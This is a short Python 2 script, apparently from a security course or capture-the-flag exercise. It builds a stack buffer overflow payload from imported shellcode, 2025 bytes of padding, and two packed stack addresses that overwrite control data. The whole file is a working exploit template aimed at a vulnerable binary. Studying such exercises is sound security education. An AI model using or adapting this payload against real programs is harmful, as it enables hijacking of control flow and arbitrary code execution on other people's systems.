from struct import pack
from shellcode import shellcode

print shellcode + '0'*2025 + pack("<I", 0xbffe8d88) + pack("<I", 0xbffe959c)
